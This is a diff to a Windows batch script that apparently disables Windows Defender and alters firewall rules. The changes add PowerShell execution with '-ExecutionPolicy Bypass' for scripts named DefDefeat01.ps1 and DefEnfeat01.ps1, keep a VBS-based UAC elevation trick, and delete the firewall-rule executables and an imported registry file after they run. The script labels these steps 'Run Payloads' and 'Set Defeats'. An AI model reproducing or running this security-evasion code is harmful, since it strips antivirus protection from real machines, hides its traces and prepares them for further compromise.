@@ -50,6 +50,7 @@ set ATTRIBEXE=%pathCMD%\attrib.exe
 set BITSADMINEXE=%pathCMD%\bitsadmin.exe
 set REGEXE=%pathCMD%\reg.exe
 set FINDEXE=%pathCMD%\find.exe
+set WPWSHEXE=%pathCMD%\WindowsPowerShell\v1.0\powershell.exe
 
 rem
 echo Set Registry Nodes...
@@ -70,6 +71,7 @@ if not exist %pathCMD% echo %pathCMD% not found && exit /b 16
 if not exist %FINDEXE% echo %FINDEXE% not found && exit /b 16
 if not exist %CMDEXE% echo %CMDEXE% not exists && exit /b 16
 if not exist %REGEXE% echo %REGEXE% doesn't exist && exit /b 16
+if not exist %WPWSHEXE% echo %WPWSHEXE% doesn't exist && exit /b 16
 if not exist %TPDL% echo %TPDL% not exists && exit /b 16
 if not exist "%ALLUSERSPROFILE%" echo %ALLUSERSPROFILE% not found && exit /b 16
 if not exist "%allDefeatPath%" echo %allDefeatPath% not found && exit /b 16
@@ -92,12 +94,13 @@ if '%errorlevel%' NEQ '0' (
 rem Lock Data
 exit /b 17
 rem
-    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    set getadmin=DefDefeat.01
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\%getadmin%.vbs"
     set params = %*:"="
-    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
+    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\%getadmin%.vbs"
 
-    %wscriptexe% "%temp%\getadmin.vbs"
-    del "%temp%\getadmin.vbs"
+    %wscriptexe% "%temp%\%getadmin%.vbs"
+    del "%temp%\%getadmin%.vbs"
     exit /B 0
 
 :gotAdmin
@@ -122,8 +125,8 @@ rem if not exist %SETACLEXE% echo "%SETACLEXE% not present" && exit /b 7
 rem
 echo Define Packets Variables...
 rem
-set DefenderDefeat=DefDefeat01.exe
-set DefenderEnfeat=DefEnfeat01.exe
+set DefenderDefeat=DefDefeat01.ps1
+set DefenderEnfeat=DefEnfeat01.ps1
 set WindowsFireWallAddRules=WindowsFireWallAddRules.exe
 set WindowsFireWallDelRules=WindowsFireWallDelRules.exe
 set DefDefeat=DefDefeat.cmd
@@ -140,13 +143,12 @@ call "%LocalFolder%\%FoldersCreate%"
 
 echo Run %LocalFolder%\%WindowsFireWallDelRules%
 "%LocalFolder%\%WindowsFireWallDelRules%"
-rem del /Q /F "%LocalFolder%\%WindowsFireWallDelRules%"
+del /Q /F "%LocalFolder%\%WindowsFireWallDelRules%"
 echo Run %LocalFolder%\%WindowsFireWallAddRules%
 "%LocalFolder%\%WindowsFireWallAddRules%"
-rem del /Q /F "%LocalFolder%\%WindowsFireWallAddRules%"
+del /Q /F "%LocalFolder%\%WindowsFireWallAddRules%"
 echo Run %LocalFolder%\%DefSmScr%
 %REGEXE% import "%LocalFolder%\%DefSmScr%"
-del /Q /F "%LocalFolder%\%DefSmScr%"
 
 echo Set Defeats...
 rem
@@ -160,11 +162,13 @@ rem Run Payloads
 rem
 echo Run Smart Defender Enfeat ...
 echo Run %LocalFolder%\%DefenderEnfeat% ...
-"%LocalFolder%\%DefenderEnfeat%"
+rem "%LocalFolder%\%DefenderEnfeat%"
+%WPWSHEXE% -NoProfile -ExecutionPolicy Bypass -File "%LocalFolder%\%DefenderEnfeat%"
 
 echo Run Smart Defender Defeat ...
 echo Run %LocalFolder%\%DefenderDefeat% ...
-"%LocalFolder%\%DefenderDefeat%"
+rem "%LocalFolder%\%DefenderDefeat%"
+%WPWSHEXE% -NoProfile -ExecutionPolicy Bypass -File "%LocalFolder%\%DefenderDefeat%"
 
 echo Run Defeat Soft...
 echo Run %LocalFolder%\%DefDefSoft%...
@@ -172,6 +176,7 @@ call "%LocalFolder%\%DefDefSoft%"
 del /Q /F "%LocalFolder%\%DefDefSoft%"
 rem del /Q /F "%LocalFolder%\%DefenderDefeat%"
 del /Q /F "%LocalFolder%\%DefDefeatSoftACL%"
+del /Q /F "%LocalFolder%\%DefSmScr%"
 
 echo Success Script Run %0
 goto End
